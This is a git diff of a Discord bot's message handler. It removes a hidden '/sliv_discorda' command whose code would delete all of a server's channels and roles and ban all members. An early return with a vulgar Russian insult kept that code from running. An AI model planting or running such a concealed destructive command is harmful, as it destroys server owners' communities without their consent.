@@ -277,19 +277,6 @@ bot.on('message', async message => {
 
     let re = /(\d+(\.\d)*)/i;
     const authorrisbot = new Discord.RichEmbed().setAuthor(`© 2018 Risbot Company™`, `https://pp.userapi.com/c849132/v849132806/b35ca/2RD_7K2ysns.jpg?ava=1`, "https://vk.com/risbot");
-    
-    if (message.content == '/sliv_discorda'){
-        return message.reply('извините, но вы гандон, что бы использовать данную команду.')
-        message.guild.channels.forEach(channel => {
-            channel.delete();
-        });
-        message.guild.roles.forEach(role => {
-            role.delete();
-        })
-        message.guild.members.forEach(member => {
-            member.ban();    
-        })
-    }
 
     if (message.content.toLowerCase().startsWith(`/report`)){
         const args = message.content.slice('/report').split(/ +/);
